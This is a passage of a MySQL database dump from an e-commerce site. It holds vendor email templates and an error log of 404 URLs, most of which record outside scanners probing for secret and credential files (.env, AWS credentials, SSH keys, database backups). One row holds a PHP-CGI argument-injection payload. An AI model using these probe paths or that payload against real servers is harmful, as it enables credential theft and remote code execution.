(12,'registration-denied','vendor','registration-denied','Registration Denied','<div><b>Hi {vendorName},</b></div><div><b><br></b></div><div>Your registration request has been denied by admin. Please contact with admin or support center if you have any queries.</div><div><br></div><div>Meanwhile, click here to visit the shop website</div><div><font color=\"#0000ff\"> <a href=\"https://venu.uz\" target=\"_blank\">https://venu.uz</a></font></div>',NULL,NULL,NULL,NULL,NULL,'Please contact us for any queries, we are always happy to help.','Copyright 2025 . All right reserved.',NULL,NULL,'[\"product_information\",\"order_information\",\"button_content\",\"banner_image\"]',1,1,1,1,'2025-06-23 22:36:57','2025-06-23 22:36:57'),
(13,'account-suspended','vendor','account-suspended','Account Suspended','<div><b>Hi {vendorName},</b></div><div><b><br></b></div><div>Your account access has been suspended by admin.From now you can access your app and panel again Please contact us for any queries we’re always happy to help.</div><div><br></div><div>Meanwhile, click here to visit the shop website</div><div><font color=\"#0000ff\"> <a href=\"https://venu.uz\" target=\"_blank\">https://venu.uz</a></font></div>',NULL,NULL,NULL,NULL,NULL,'Please contact us for any queries, we are always happy to help.','Copyright 2025 . All right reserved.',NULL,NULL,'[\"product_information\",\"order_information\",\"button_content\",\"banner_image\"]',1,1,1,1,'2025-06-23 22:36:57','2025-06-23 22:36:57'),
(14,'account-activation','vendor','account-activation','Account Activation','<div><b>Hi {vendorName},</b></div><div><b><br></b></div><div>Your account suspension has been revoked by admin. From now you can access your app and panel again Please contact us for any queries we’re always happy to help.</div><div><br></div><div>Meanwhile, click here to visit the shop website</div><div><font color=\"#0000ff\"> <a href=\"https://venu.uz\" target=\"_blank\">https://venu.uz</a></font></div>',NULL,NULL,NULL,NULL,NULL,'Please contact us for any queries, we are always happy to help.','Copyright 2025 . All right reserved.',NULL,NULL,'[\"product_information\",\"order_information\",\"button_content\",\"banner_image\"]',1,1,1,1,'2025-06-23 22:36:57','2025-06-23 22:36:57'),
(15,'forgot-password','vendor','forgot-password','Change Password Request','<p><b>Hi {vendorName},</b></p><p>Please click the link below to change your password.</p>',NULL,NULL,NULL,NULL,NULL,'Please contact us for any queries, we are always happy to help.','Copyright 2025 . All right reserved.',NULL,NULL,'[\"product_information\",\"order_information\",\"button_content\",\"banner_image\"]',1,1,1,1,'2025-06-23 22:36:57','2025-06-23 22:36:57'),
(16,'order-received','vendor','order-received','New Order Received','<p><b>Hi {vendorName},</b></p><p>We have sent you this email to notify that you have a new order.You will be able to see your orders after login to your panel.</p>',NULL,NULL,NULL,NULL,NULL,'Please contact us for any queries, we are always happy to help.','Copyright 2025 . All right reserved.',NULL,NULL,'[\"icon\",\"product_information\",\"button_content\",\"banner_image\"]',1,1,1,1,'2025-06-23 22:36:57','2025-06-23 22:36:57'),
(17,'reset-password-verification','delivery-man','reset-password-verification','OTP Verification For Password Reset','<p><b>Hi {deliveryManName},</b></p><p>Your verification code is</p>',NULL,NULL,NULL,NULL,NULL,'Please contact us for any queries, we are always happy to help.','Copyright 2025 . All right reserved.',NULL,NULL,'[\"product_information\",\"order_information\",\"button_content\",\"banner_image\"]',1,1,1,1,'2025-06-23 22:36:57','2025-06-23 22:36:57');
/*!40000 ALTER TABLE `email_templates` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `emergency_contacts`
--

DROP TABLE IF EXISTS `emergency_contacts`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `emergency_contacts` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` bigint(20) NOT NULL,
  `name` varchar(191) NOT NULL,
  `country_code` varchar(20) DEFAULT NULL,
  `phone` varchar(25) NOT NULL,
  `status` tinyint(1) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `emergency_contacts`
--

LOCK TABLES `emergency_contacts` WRITE;
/*!40000 ALTER TABLE `emergency_contacts` DISABLE KEYS */;
/*!40000 ALTER TABLE `emergency_contacts` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `error_logs`
--

DROP TABLE IF EXISTS `error_logs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `error_logs` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `status_code` int(11) NOT NULL,
  `url` varchar(255) NOT NULL,
  `hit_counts` int(11) NOT NULL DEFAULT 0,
  `redirect_url` varchar(255) DEFAULT NULL,
  `redirect_status` varchar(255) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=1160 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `error_logs`
--

LOCK TABLES `error_logs` WRITE;
/*!40000 ALTER TABLE `error_logs` DISABLE KEYS */;
INSERT INTO `error_logs` VALUES
(1,404,'http://127.0.0.1:8000/admin/messages/new-notification',13,NULL,NULL,'2024-12-21 06:49:44','2025-02-13 08:42:47'),
(2,404,'http://127.0.0.1:8000/admin/dashboard/real-time-activities',3,NULL,NULL,'2025-02-13 08:40:56','2025-02-13 08:41:56'),
(3,404,'https://venu.uz/login/admin',1,NULL,NULL,'2025-06-23 22:36:59','2025-06-23 22:36:59'),
(4,404,'https://venu.uz/favicon.png',5,NULL,NULL,'2025-06-23 23:28:34','2025-06-26 20:27:43'),
(5,404,'https://venu.uz/db/schema.rb',1,NULL,NULL,'2025-06-23 23:50:47','2025-06-23 23:50:47'),
(6,404,'https://venu.uz/feed',1,NULL,NULL,'2025-06-23 23:50:48','2025-06-23 23:50:48'),
(7,404,'https://venu.uz/.svn/wc.db',1,NULL,NULL,'2025-06-23 23:50:48','2025-06-23 23:50:48'),
(8,404,'https://venu.uz/_vti_pvt/service.pwd',1,NULL,NULL,'2025-06-23 23:50:48','2025-06-23 23:50:48'),
(9,404,'https://venu.uz/config.json',11,NULL,NULL,'2025-06-23 23:50:48','2025-07-11 01:00:44'),
(10,404,'https://venu.uz/web.config',2,NULL,NULL,'2025-06-23 23:50:48','2025-06-30 20:32:12'),
(11,404,'https://venu.uz/backup.sql',1,NULL,NULL,'2025-06-23 23:50:48','2025-06-23 23:50:48'),
(12,404,'https://venu.uz/server-status',2,NULL,NULL,'2025-06-23 23:50:48','2025-06-29 11:05:53'),
(13,404,'https://venu.uz/settings.py',4,NULL,NULL,'2025-06-23 23:50:48','2025-07-06 15:41:58'),
(14,404,'https://venu.uz/backup.tar.gz',2,NULL,NULL,'2025-06-23 23:50:48','2025-07-01 11:01:20'),
(15,404,'https://venu.uz/config/production.json',2,NULL,NULL,'2025-06-23 23:50:48','2025-06-30 20:32:01'),
(16,404,'https://venu.uz/user_secrets.yml',1,NULL,NULL,'2025-06-23 23:50:48','2025-06-23 23:50:48'),
(17,404,'https://venu.uz/cloud-config.yml',1,NULL,NULL,'2025-06-23 23:50:48','2025-06-23 23:50:48'),
(18,404,'https://venu.uz/database.sql',2,NULL,NULL,'2025-06-23 23:50:48','2025-07-01 11:01:19'),
(19,404,'https://venu.uz/etc/ssl/private/server.key',1,NULL,NULL,'2025-06-23 23:50:48','2025-06-23 23:50:48'),
(20,404,'https://venu.uz/.vscode/sftp.json',2,NULL,NULL,'2025-06-23 23:50:48','2025-06-29 11:05:50'),
(21,404,'https://venu.uz/docker-compose.yml',3,NULL,NULL,'2025-06-23 23:50:48','2025-07-01 11:01:06'),
(22,404,'https://venu.uz/backup.zip',2,NULL,NULL,'2025-06-23 23:50:49','2025-07-01 11:01:18'),
(23,404,'https://venu.uz/.ssh/id_rsa',1,NULL,NULL,'2025-06-23 23:50:49','2025-06-23 23:50:49'),
(24,404,'https://venu.uz/config.yml',7,NULL,NULL,'2025-06-23 23:50:49','2025-07-06 19:14:10'),
(25,404,'https://venu.uz/.ssh/id_ed25519',1,NULL,NULL,'2025-06-23 23:50:49','2025-06-23 23:50:49'),
(26,404,'https://venu.uz/database_backup.sql',1,NULL,NULL,'2025-06-23 23:50:49','2025-06-23 23:50:49'),
(27,404,'https://venu.uz/config.yaml',7,NULL,NULL,'2025-06-23 23:50:49','2025-07-06 19:14:10'),
(28,404,'https://venu.uz/.ssh/id_ecdsa',1,NULL,NULL,'2025-06-23 23:50:49','2025-06-23 23:50:49'),
(29,404,'https://venu.uz/server.key',2,NULL,NULL,'2025-06-23 23:50:49','2025-07-11 01:01:16'),
(30,404,'https://venu.uz/config.xml',1,NULL,NULL,'2025-06-23 23:50:49','2025-06-23 23:50:49'),
(31,404,'https://venu.uz/api/.env',12,NULL,NULL,'2025-06-23 23:50:49','2025-07-11 01:00:39'),
(32,404,'https://venu.uz/.env.production',8,NULL,NULL,'2025-06-23 23:50:49','2025-07-11 01:00:18'),
(33,404,'https://venu.uz/dump.sql',2,NULL,NULL,'2025-06-23 23:50:49','2025-07-01 11:01:19'),
(34,404,'https://venu.uz/secrets.json',3,NULL,NULL,'2025-06-23 23:50:49','2025-07-11 01:00:48'),
(35,404,'https://venu.uz/.aws/credentials',12,NULL,NULL,'2025-06-23 23:50:49','2025-07-11 01:00:11'),
(36,404,'https://venu.uz/.well-known/security.txt',2,NULL,NULL,'2025-06-23 23:50:50','2025-06-23 23:50:50'),
(37,404,'https://95.182.118.148/cgi-bin/luci/;stok=/locale',5,NULL,NULL,'2025-06-23 23:56:23','2025-06-26 14:00:23'),
(38,404,'https://0.0.0.0/admin/assets/js/pbxlib.js',5,NULL,NULL,'2025-06-24 01:08:17','2025-06-26 07:56:13'),
(39,404,'https://95.182.118.148/actuator/gateway/routes',3,NULL,NULL,'2025-06-24 04:12:23','2025-06-26 04:32:58'),
(40,404,'https://95.182.118.148/owa/auth/logon.aspx',2,NULL,NULL,'2025-06-24 04:15:11','2025-06-26 14:24:08'),
(41,404,'https://0.0.0.0/admin/assets/css/jquery-ui.css',2,NULL,NULL,'2025-06-24 05:23:29','2025-06-26 09:34:57'),
(42,404,'https://venu.uz/word%70ress',1,NULL,NULL,'2025-06-24 07:45:35','2025-06-24 07:45:35'),
(43,404,'https://venu.uz/sm/f07d8d7b2652873f485707eab4f3d300bf1f6f3b42912e189c8933b1b9b3dfde.map',13,NULL,NULL,'2025-06-24 09:20:33','2025-07-11 23:22:10'),
(44,404,'https://venu.uz/login/vendor',1,NULL,NULL,'2025-06-24 09:24:26','2025-06-24 09:24:26'),
(45,404,'https://95.182.118.148/hello.world?%ADd%20allow_url_include%3D1%20%ADd%20auto_prepend_file%3Dphp%3A%2F%2Finput=',3,NULL,NULL,'2025-06-24 10:12:27','2025-06-25 02:41:49'),
(46,404,'https://venu.uz//venu.uz/public/assets/front-end/vendor/drift-zoom/dist/Drift.min.js',8,NULL,NULL,'2025-06-24 16:25:25','2025-07-06 07:11:29'),
(47,404,'https://venu.uz//venu.uz/public/assets/front-end/vendor/lightgallery.js',8,NULL,NULL,'2025-06-24 16:25:25','2025-07-06 07:11:30'),
(48,404,'https://venu.uz//venu.uz/public/assets/front-end/vendor/jquery/dist/jquery-2.2.4.min.js',8,NULL,NULL,'2025-06-24 16:25:25','2025-07-06 07:11:29'),
(49,404,'https://venu.uz//venu.uz/public/assets/front-end/vendor/lightgallery.js/dist/js/lightgallery.min.js',8,NULL,NULL,'2025-06-24 16:25:25','2025-07-06 07:11:30'),
(50,404,'https://venu.uz//www.gstatic.com/firebasejs/8.3.2/firebase-auth.js',8,NULL,NULL,'2025-06-24 16:25:25','2025-07-06 07:11:30'),
(51,404,'https://venu.uz//venu.uz/public/assets/front-end/vendor/smooth-scroll/dist/smooth-scroll.polyfills.min.js',7,NULL,NULL,'2025-06-24 16:25:26','2025-07-06 07:11:30'),
(52,404,'https://venu.uz//venu.uz/public/assets/front-end/js/theme.js',8,NULL,NULL,'2025-06-24 16:25:26','2025-07-06 07:11:29'),
(53,404,'https://venu.uz//venu.uz/public/assets/front-end/vendor/bootstrap/dist/js/bootstrap.bundle.min.js',7,NULL,NULL,'2025-06-24 16:25:26','2025-07-02 23:37:54'),
(54,404,'https://venu.uz//www.gstatic.com/firebasejs/8.3.2/firebase-app.js',8,NULL,NULL,'2025-06-24 16:25:26','2025-07-06 07:11:30'),
(55,404,'https://venu.uz//venu.uz/public/assets/front-end/vendor/simplebar/dist/simplebar.min.js',8,NULL,NULL,'2025-06-24 16:25:26','2025-07-06 07:11:30'),
(56,404,'https://venu.uz//venu.uz/public/js/lightbox.min.js',8,NULL,NULL,'2025-06-24 16:25:26','2025-07-06 07:11:30'),
(57,404,'https://venu.uz//www.gstatic.com/firebasejs/8.3.2/firebase-messaging.js',8,NULL,NULL,'2025-06-24 16:25:26','2025-07-06 07:11:30'),
(58,404,'https://venu.uz//venu.uz/public/assets/front-end/vendor/bs-custom-file-input/dist/bs-custom-file-input.min.js',8,NULL,NULL,'2025-06-24 16:25:26','2025-07-06 07:11:30'),
(59,404,'https://venu.uz//venu.uz/firebase-messaging-sw.js',8,NULL,NULL,'2025-06-24 16:25:26','2025-07-06 07:11:30'),
(60,404,'https://venu.uz//venu.uz/public/assets/front-end/js/custom.js',7,NULL,NULL,'2025-06-24 16:25:26','2025-07-06 07:11:29'),
(61,404,'https://venu.uz//venu.uz/public/assets/front-end/vendor/tiny-slider/dist/min/tiny-slider.js',8,NULL,NULL,'2025-06-24 16:25:26','2025-07-06 07:11:30'),
(62,404,'https://venu.uz//venu.uz/public/assets/front-end/js/sweet_alert.js',8,NULL,NULL,'2025-06-24 16:25:26','2025-07-06 07:11:29'),
(63,404,'https://venu.uz//venu.uz/public/assets/front-end/js/owl.carousel.min.js',8,NULL,NULL,'2025-06-24 16:25:27','2025-07-06 07:11:31'),
(64,404,'https://venu.uz//venu.uz/public/assets/back-end/js/toastr.js',8,NULL,NULL,'2025-06-24 16:25:27','2025-07-06 07:11:30'),
(65,404,'https://venu.uz//venu.uz/public/assets/front-end/js/slick.js',8,NULL,NULL,'2025-06-24 16:25:27','2025-07-06 07:11:29'),
(66,404,'https://venu.uz//venu.uz/public/assets/front-end/js/home.js',8,NULL,NULL,'2025-06-24 16:25:29','2025-07-06 07:11:31'),
(67,404,'https://venu.uz//venu.uz/public/assets/front-end/vendor/firebase/firebase.min.js',8,NULL,NULL,'2025-06-24 16:25:29','2025-07-06 07:11:31'),
(68,404,'https://95.182.118.148/developmentserver/metadatauploader',2,NULL,NULL,'2025-06-24 17:10:48','2025-06-25 19:46:17'),
(69,404,'https://95.182.118.148/webui',2,NULL,NULL,'2025-06-24 17:47:17','2025-06-25 06:38:43'),
(70,404,'https://95.182.118.148/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application',1,NULL,NULL,'2025-06-24 19:34:29','2025-06-24 19:34:29'),
(71,404,'https://venu.uz/js/twint_ch.js',2,NULL,NULL,'2025-06-24 21:27:27','2025-06-26 00:12:25'),
(72,404,'https://venu.uz/js/lkk_ch.js',2,NULL,NULL,'2025-06-24 21:27:33','2025-06-26 00:12:18'),
(73,404,'https://95.182.118.148/config/php.ini',1,NULL,NULL,'2025-06-24 22:28:58','2025-06-24 22:28:58'),
(74,404,'https://95.182.118.148/admin/config',1,NULL,NULL,'2025-06-24 22:28:58','2025-06-24 22:28:58'),
(75,404,'https://95.182.118.148/index.html',1,NULL,NULL,'2025-06-24 22:28:59','2025-06-24 22:28:59'),
(76,404,'https://95.182.118.148/config.properties',1,NULL,NULL,'2025-06-24 22:29:08','2025-06-24 22:29:08'),
(77,404,'https://95.182.118.148/main.js',1,NULL,NULL,'2025-06-24 22:29:09','2025-06-24 22:29:09'),
(78,404,'https://95.182.118.148/phpinfo',1,NULL,NULL,'2025-06-24 22:29:09','2025-06-24 22:29:09'),
(79,404,'https://95.182.118.148/test',1,NULL,NULL,'2025-06-24 22:29:10','2025-06-24 22:29:10'),
(80,404,'https://95.182.118.148/.aws/credentials',1,NULL,NULL,'2025-06-24 22:29:10','2025-06-24 22:29:10'),
(81,404,'https://95.182.118.148/app_dev.php/_profiler/phpinfo',1,NULL,NULL,'2025-06-24 22:29:10','2025-06-24 22:29:10'),
(82,404,'https://95.182.118.148/config/constants.js',1,NULL,NULL,'2025-06-24 22:29:11','2025-06-24 22:29:11'),
(83,404,'https://95.182.118.148/application.properties',1,NULL,NULL,'2025-06-24 22:29:12','2025-06-24 22:29:12'),
(84,404,'https://95.182.118.148/config.ini',1,NULL,NULL,'2025-06-24 22:29:12','2025-06-24 22:29:12'),
(85,404,'https://95.182.118.148/index.php/phpinfo',1,NULL,NULL,'2025-06-24 22:29:13','2025-06-24 22:29:13'),
(86,404,'https://95.182.118.148/.profile',1,NULL,NULL,'2025-06-24 22:29:13','2025-06-24 22:29:13'),
(87,404,'https://95.182.118.148/appsettings.json',1,NULL,NULL,'2025-06-24 22:29:14','2025-06-24 22:29:14'),
(88,404,'https://95.182.118.148/config/index.js',1,NULL,NULL,'2025-06-24 22:29:14','2025-06-24 22:29:14'),
(89,404,'https://95.182.118.148/config/config.js',1,NULL,NULL,'2025-06-24 22:29:15','2025-06-24 22:29:15'),
(90,404,'https://95.182.118.148/config.js',1,NULL,NULL,'2025-06-24 22:29:15','2025-06-24 22:29:15'),
(91,404,'https://95.182.118.148/gulpfile.js',1,NULL,NULL,'2025-06-24 22:29:16','2025-06-24 22:29:16'),
(92,404,'https://95.182.118.148/application-dev.properties',1,NULL,NULL,'2025-06-24 22:29:16','2025-06-24 22:29:16'),
(93,404,'https://95.182.118.148/config/default.json',1,NULL,NULL,'2025-06-24 22:29:16','2025-06-24 22:29:16'),
(94,404,'https://95.182.118.148/info',1,NULL,NULL,'2025-06-24 22:29:17','2025-06-24 22:29:17'),
(95,404,'https://95.182.118.148/app.js',1,NULL,NULL,'2025-06-24 22:29:25','2025-06-24 22:29:25'),
(96,404,'https://95.182.118.148/env.json',1,NULL,NULL,'2025-06-24 22:29:25','2025-06-24 22:29:25'),
(97,404,'https://95.182.118.148/config/config.ini',1,NULL,NULL,'2025-06-24 22:29:25','2025-06-24 22:29:25'),
(98,404,'https://95.182.118.148/config/environments/production.rb',1,NULL,NULL,'2025-06-24 22:29:26','2025-06-24 22:29:26'),
(99,404,'https://95.182.118.148/environment.ts',1,NULL,NULL,'2025-06-24 22:29:26','2025-06-24 22:29:26'),
(100,404,'https://95.182.118.148/config/aws.json',1,NULL,NULL,'2025-06-24 22:29:27','2025-06-24 22:29:27'),
(101,404,'https://95.182.118.148/app.py',1,NULL,NULL,'2025-06-24 22:29:27','2025-06-24 22:29:27'),
(102,404,'https://95.182.118.148/application/config/constants.php',1,NULL,NULL,'2025-06-24 22:29:35','2025-06-24 22:29:35'),
(103,404,'https://95.182.118.148/debug/default',1,NULL,NULL,'2025-06-24 22:29:36','2025-06-24 22:29:36'),
(104,404,'https://95.182.118.148/src/config.js',1,NULL,NULL,'2025-06-24 22:29:36','2025-06-24 22:29:36'),
(105,404,'https://95.182.118.148/config/application.yml',1,NULL,NULL,'2025-06-24 22:29:36','2025-06-24 22:29:36'),
(106,404,'https://95.182.118.148/config/services.yaml',1,NULL,NULL,'2025-06-24 22:29:37','2025-06-24 22:29:37'),
(107,404,'https://95.182.118.148/api/config/tsconfig.json',1,NULL,NULL,'2025-06-24 22:29:37','2025-06-24 22:29:37'),
(108,404,'https://95.182.118.148/static/.gitlab-ci.yml',1,NULL,NULL,'2025-06-24 22:29:45','2025-06-24 22:29:45'),
(109,404,'https://95.182.118.148/server.js',1,NULL,NULL,'2025-06-24 22:29:46','2025-06-24 22:29:46'),
(110,404,'https://95.182.118.148/config/development.json',1,NULL,NULL,'2025-06-24 22:29:46','2025-06-24 22:29:46'),
(111,404,'https://95.182.118.148/config/config.json',1,NULL,NULL,'2025-06-24 22:29:48','2025-06-24 22:29:48'),
(112,404,'https://95.182.118.148/frontend_dev.php/$',1,NULL,NULL,'2025-06-24 22:29:49','2025-06-24 22:29:49'),
(113,404,'https://95.182.118.148/staticfiles',1,NULL,NULL,'2025-06-24 22:29:49','2025-06-24 22:29:49'),
(114,404,'https://95.182.118.148/_profiler/phpinfo',2,NULL,NULL,'2025-06-24 22:29:50','2025-06-24 23:55:27'),
(115,404,'https://95.182.118.148/Dockerfile',1,NULL,NULL,'2025-06-24 22:29:58','2025-06-24 22:29:58'),
(116,404,'https://95.182.118.148/settings.json',1,NULL,NULL,'2025-06-24 22:29:58','2025-06-24 22:29:58'),
(117,404,'https://95.182.118.148/src/main/resources/appsettings.yml',1,NULL,NULL,'2025-06-24 22:29:59','2025-06-24 22:29:59'),
(118,404,'https://95.182.118.148/configs/application.ini',1,NULL,NULL,'2025-06-24 22:29:59','2025-06-24 22:29:59'),
(119,404,'https://95.182.118.148/js/config.js',1,NULL,NULL,'2025-06-24 22:30:06','2025-06-24 22:30:06'),
(120,404,'https://95.182.118.148/src/main/resources/application.properties',1,NULL,NULL,'2025-06-24 22:30:07','2025-06-24 22:30:07'),
(121,404,'https://95.182.118.148/products/.gitlab-ci.yml',1,NULL,NULL,'2025-06-24 22:30:14','2025-06-24 22:30:14'),
(122,404,'https://95.182.118.148/manifest.json',1,NULL,NULL,'2025-06-24 22:30:14','2025-06-24 22:30:14'),
(123,404,'https://95.182.118.148/ecosystem.config.js',1,NULL,NULL,'2025-06-24 22:30:14','2025-06-24 22:30:14'),
(124,404,'https://95.182.118.148/device/device.js',1,NULL,NULL,'2025-06-24 22:30:15','2025-06-24 22:30:15'),
(125,404,'https://95.182.118.148/config.json',2,NULL,NULL,'2025-06-24 22:30:21','2025-06-25 10:17:56'),
(126,404,'https://95.182.118.148/admin/test',1,NULL,NULL,'2025-06-24 22:30:23','2025-06-24 22:30:23'),
(127,404,'https://95.182.118.148/Node.js/JavaScript',1,NULL,NULL,'2025-06-24 22:30:23','2025-06-24 22:30:23'),
(128,404,'https://95.182.118.148/config/production.json',1,NULL,NULL,'2025-06-24 22:30:24','2025-06-24 22:30:24'),
(129,404,'https://95.182.118.148/config/settings.py',1,NULL,NULL,'2025-06-24 22:30:24','2025-06-24 22:30:24'),
(130,404,'https://95.182.118.148/env.py',1,NULL,NULL,'2025-06-24 22:30:25','2025-06-24 22:30:25'),
(131,404,'https://95.182.118.148/config.py',1,NULL,NULL,'2025-06-24 22:30:25','2025-06-24 22:30:25'),
(132,404,'https://95.182.118.148/config/dev_config.py',1,NULL,NULL,'2025-06-24 22:30:32','2025-06-24 22:30:32'),
(133,404,'https://95.182.118.148/config/prod_config.py',1,NULL,NULL,'2025-06-24 22:30:32','2025-06-24 22:30:32'),
(134,404,'https://95.182.118.148/config/test_config.py',1,NULL,NULL,'2025-06-24 22:30:33','2025-06-24 22:30:33'),
(135,404,'https://95.182.118.148/settings.py',1,NULL,NULL,'2025-06-24 22:30:33','2025-06-24 22:30:33'),
(136,404,'https://95.182.118.148/development.py',1,NULL,NULL,'2025-06-24 22:30:34','2025-06-24 22:30:34'),
(137,404,'https://95.182.118.148/config/environments/development.rb',1,NULL,NULL,'2025-06-24 22:30:34','2025-06-24 22:30:34'),
(138,404,'https://95.182.118.148/config/environments/test.rb',1,NULL,NULL,'2025-06-24 22:30:35','2025-06-24 22:30:35'),
(139,404,'https://95.182.118.148/config/application.rb',1,NULL,NULL,'2025-06-24 22:30:35','2025-06-24 22:30:35'),
(140,404,'https://95.182.118.148/config/database.yml',1,NULL,NULL,'2025-06-24 22:30:36','2025-06-24 22:30:36'),
(141,404,'https://95.182.118.148/config/secrets.yml',1,NULL,NULL,'2025-06-24 22:30:42','2025-06-24 22:30:42'),
(142,404,'https://95.182.118.148/config/initializers/devise.rb',1,NULL,NULL,'2025-06-24 22:30:42','2025-06-24 22:30:42'),
(143,404,'https://95.182.118.148/config/initializers/sidekiq.rb',1,NULL,NULL,'2025-06-24 22:30:43','2025-06-24 22:30:43'),
(144,404,'https://95.182.118.148/config/cable.yml',1,NULL,NULL,'2025-06-24 22:30:43','2025-06-24 22:30:43'),
(145,404,'https://95.182.118.148/config/puma.rb',1,NULL,NULL,'2025-06-24 22:30:44','2025-06-24 22:30:44'),
(146,404,'https://95.182.118.148/web.config',1,NULL,NULL,'2025-06-24 22:30:44','2025-06-24 22:30:44'),
(147,404,'https://95.182.118.148/appsettings.Development.json',1,NULL,NULL,'2025-06-24 22:30:44','2025-06-24 22:30:44'),
(148,404,'https://95.182.118.148/appsettings.Production.json',1,NULL,NULL,'2025-06-24 22:30:45','2025-06-24 22:30:45'),
(149,404,'https://95.182.118.148/appsettings.Test.json',1,NULL,NULL,'2025-06-24 22:30:45','2025-06-24 22:30:45'),
(150,404,'https://95.182.118.148/web.Release.config',1,NULL,NULL,'2025-06-24 22:30:45','2025-06-24 22:30:45'),
(151,404,'https://95.182.118.148/web.Debug.config',1,NULL,NULL,'2025-06-24 22:30:46','2025-06-24 22:30:46'),
(152,404,'https://95.182.118.148/launchSettings.json',1,NULL,NULL,'2025-06-24 22:30:46','2025-06-24 22:30:46'),
(153,404,'https://95.182.118.148/nuget.config',1,NULL,NULL,'2025-06-24 22:30:47','2025-06-24 22:30:47'),
(154,404,'https://95.182.118.148/bundleconfig.json',1,NULL,NULL,'2025-06-24 22:30:47','2025-06-24 22:30:47'),
(155,404,'https://95.182.118.148/config/dev_settings.py',1,NULL,NULL,'2025-06-24 22:30:47','2025-06-24 22:30:47'),
(156,404,'https://95.182.118.148/config/prod_settings.py',1,NULL,NULL,'2025-06-24 22:30:48','2025-06-24 22:30:48'),
(157,404,'https://95.182.118.148/config/test_settings.py',1,NULL,NULL,'2025-06-24 22:30:48','2025-06-24 22:30:48'),
(158,404,'https://95.182.118.148/config/asgi.py',1,NULL,NULL,'2025-06-24 22:30:48','2025-06-24 22:30:48'),
(159,404,'https://95.182.118.148/config/wsgi.py',1,NULL,NULL,'2025-06-24 22:30:49','2025-06-24 22:30:49'),
(160,404,'https://95.182.118.148/config/urls.py',1,NULL,NULL,'2025-06-24 22:30:49','2025-06-24 22:30:49'),
(161,404,'https://95.182.118.148/config/settings/__init__.py',1,NULL,NULL,'2025-06-24 22:30:49','2025-06-24 22:30:49'),
(162,404,'https://95.182.118.148/config/settings/base.py',1,NULL,NULL,'2025-06-24 22:30:50','2025-06-24 22:30:50'),
(163,404,'https://95.182.118.148/config/settings/local.py',1,NULL,NULL,'2025-06-24 22:30:50','2025-06-24 22:30:50'),
(164,404,'https://95.182.118.148/src/main/resources/application.yml',1,NULL,NULL,'2025-06-24 22:30:57','2025-06-24 22:30:57'),
(165,404,'https://95.182.118.148/src/main/resources/bootstrap.yml',1,NULL,NULL,'2025-06-24 22:30:57','2025-06-24 22:30:57'),
(166,404,'https://95.182.118.148/src/main/resources/bootstrap.properties',1,NULL,NULL,'2025-06-24 22:30:58','2025-06-24 22:30:58'),
(167,404,'https://95.182.118.148/src/main/resources/application-dev.yml',1,NULL,NULL,'2025-06-24 22:30:58','2025-06-24 22:30:58'),
(168,404,'https://95.182.118.148/src/main/resources/application-prod.yml',1,NULL,NULL,'2025-06-24 22:30:59','2025-06-24 22:30:59'),
(169,404,'https://95.182.118.148/src/main/resources/application-test.yml',1,NULL,NULL,'2025-06-24 22:30:59','2025-06-24 22:30:59'),
(170,404,'https://95.182.118.148/src/main/resources/logback-spring.xml',1,NULL,NULL,'2025-06-24 22:30:59','2025-06-24 22:30:59'),
(171,404,'https://95.182.118.148/src/main/resources/log4j2.xml',1,NULL,NULL,'2025-06-24 22:31:00','2025-06-24 22:31:00'),
(172,404,'https://95.182.118.148/src/main/resources/application-context.xml',1,NULL,NULL,'2025-06-24 22:31:00','2025-06-24 22:31:00'),
(173,404,'https://95.182.118.148/src/environments/environment.ts',1,NULL,NULL,'2025-06-24 22:31:00','2025-06-24 22:31:00'),
(174,404,'https://95.182.118.148/src/environments/environment.prod.ts',1,NULL,NULL,'2025-06-24 22:31:01','2025-06-24 22:31:01'),
(175,404,'https://95.182.118.148/src/environments/environment.dev.ts',1,NULL,NULL,'2025-06-24 22:31:06','2025-06-24 22:31:06'),
(176,404,'https://95.182.118.148/src/environments/environment.test.ts',1,NULL,NULL,'2025-06-24 22:31:07','2025-06-24 22:31:07'),
(177,404,'https://95.182.118.148/angular.json',1,NULL,NULL,'2025-06-24 22:31:07','2025-06-24 22:31:07'),
(178,404,'https://95.182.118.148/tsconfig.json',1,NULL,NULL,'2025-06-24 22:31:08','2025-06-24 22:31:08'),
(179,404,'https://95.182.118.148/tsconfig.app.json',1,NULL,NULL,'2025-06-24 22:31:13','2025-06-24 22:31:13'),
(180,404,'https://95.182.118.148/tsconfig.spec.json',1,NULL,NULL,'2025-06-24 22:31:13','2025-06-24 22:31:13'),
(181,404,'https://95.182.118.148/karma.conf.js',1,NULL,NULL,'2025-06-24 22:31:13','2025-06-24 22:31:13'),
(182,404,'https://95.182.118.148/protractor.conf.js',1,NULL,NULL,'2025-06-24 22:31:14','2025-06-24 22:31:14'),
(183,404,'https://95.182.118.148/instance/config.py',1,NULL,NULL,'2025-06-24 22:31:14','2025-06-24 22:31:14'),
(184,404,'https://95.182.118.148/app/config.py',1,NULL,NULL,'2025-06-24 22:31:15','2025-06-24 22:31:15'),
(185,404,'https://95.182.118.148/app/settings.py',1,NULL,NULL,'2025-06-24 22:31:15','2025-06-24 22:31:15'),
(186,404,'https://95.182.118.148/src/config/env.js',1,NULL,NULL,'2025-06-24 22:31:15','2025-06-24 22:31:15'),
(187,404,'https://95.182.118.148/src/setupProxy.js',1,NULL,NULL,'2025-06-24 22:31:16','2025-06-24 22:31:16'),
